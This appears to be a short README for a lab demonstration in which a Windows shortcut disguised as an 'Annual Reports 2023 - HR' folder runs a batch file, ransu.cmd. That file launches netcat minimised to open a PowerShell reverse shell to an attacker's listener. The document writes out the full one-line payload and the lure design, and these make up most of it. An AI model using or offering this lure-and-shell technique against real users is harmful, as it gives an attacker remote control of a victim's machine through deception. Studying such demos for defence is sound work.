Demo was made using 2 virtual machines:   
- Kali Linux
- Windows 10

Structure:   
Annual Reports 2023 - HR.lnk -> Linked to ransu.cmd   
ransu.cmd:   
```bash
start /min nc64.exe <attacker ip> <attacker port> -e powershell
```

Both were assigned to the same internal network, and the IP-address of the attacker machine was placed as a static in the payload command.   

When the "folder"(shortcut) was opened, the payload was ran using netcat and the attacker, where the listener was, got the connection.   

[Revshell Demo](https://youtu.be/8v6djrHg2qI)
